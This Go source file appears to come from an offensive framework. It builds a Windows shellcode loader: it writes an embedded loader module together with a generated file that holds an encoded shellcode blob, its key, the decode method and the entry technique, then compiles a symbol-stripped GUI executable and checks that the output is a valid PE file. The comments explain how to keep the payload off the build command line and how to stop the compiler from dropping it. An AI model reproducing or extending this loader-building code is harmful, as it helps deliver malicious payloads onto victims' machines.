package payload

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// writeLoaderModule materializes a standalone Go module in workDir from the
// embedded loader sources plus a generated payload_gen.go carrying this
// build's blob, key, decode method and entry technique. The loader uses only
// the standard library, so the module needs no go.mod requires and no
// `go mod tidy` (no network access is required to build it).
func writeLoaderModule(workDir string, blob, key []byte, method ShellcodeEncode, entry string) error {
	entries, err := payloadFS.ReadDir("loader")
	if err != nil {
		return fmt.Errorf("read embedded loader dir: %w", err)
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".go") {
			continue
		}
		data, err := payloadFS.ReadFile("loader/" + e.Name())
		if err != nil {
			return fmt.Errorf("read embedded loader/%s: %w", e.Name(), err)
		}
		if err := os.WriteFile(filepath.Join(workDir, e.Name()), data, 0600); err != nil {
			return err
		}
	}
	if err := os.WriteFile(filepath.Join(workDir, "go.mod"), []byte("module loader\n\ngo 1.25\n"), 0600); err != nil {
		return err
	}
	gen := writePayloadGen(blob, key, method, entry)
	return os.WriteFile(filepath.Join(workDir, "zz_payload_gen.go"), gen, 0600)
}

// writePayloadGen renders the source file that injects the per-build payload
// into the loader binary. The blob and key travel through this ephemeral
// source file (not the go build argv) so they never appear in the build
// process command line (same reasoning as writeConfigInjectFile).
//
// The payload is delivered as PACKAGE-LEVEL variable declarations, not
// init()-assignments: Go 1.25's static-init data folding drops the backing
// bytes of composite literals assigned inside init() (observed with
// `x = []byte{...}` and `copy(x, ...)` forms), which would strip the embedded
// payload from the built EXE. A package-level `var x = []byte{...}` keeps the
// literal bytes in the data segment.
func writePayloadGen(blob, key []byte, method ShellcodeEncode, entry string) []byte {
	var buf bytes.Buffer
	buf.WriteString("package main\n\n// Code-generated at build time; do not edit.\n\nvar payloadBlob = []byte{")
	for i, b := range blob {
		if i > 0 {
			buf.WriteString(", ")
		}
		fmt.Fprintf(&buf, "0x%02x", b)
	}
	buf.WriteString("}\n\nvar payloadKey = []byte{")
	for i, b := range key {
		if i > 0 {
			buf.WriteString(", ")
		}
		fmt.Fprintf(&buf, "0x%02x", b)
	}
	buf.WriteString("}\n")
	fmt.Fprintf(&buf, "\nvar payloadMethod = %q\n", string(method))
	fmt.Fprintf(&buf, "\nvar payloadEntry = %q\n", entry)
	return buf.Bytes()
}

// buildLoaderEXE compiles the loader module in workDir into a Windows amd64
// GUI executable and returns its bytes. The output is validated as a real PE
// so a broken build fails loudly instead of delivering a corrupt artifact.
func buildLoaderEXE(workDir string, blob, key []byte, method ShellcodeEncode, entry string) ([]byte, error) {
	if err := writeLoaderModule(workDir, blob, key, method, entry); err != nil {
		return nil, err
	}
	goCmd := getGoCmd()
	if goCmd == "" {
		return nil, fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	outPath := filepath.Join(workDir, "loader.exe")
	if err := buildAgentBinary(goCmd, workDir, "-s -w -H=windowsgui", outPath, false, "windows", "amd64", "", "", false, false); err != nil {
		return nil, fmt.Errorf("loader build failed: %w", err)
	}
	if err := validatePE(outPath, windowsMachine("amd64")); err != nil {
		return nil, fmt.Errorf("loader output failed PE validation: %w", err)
	}
	data, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("read built loader: %w", err)
	}
	return data, nil
}
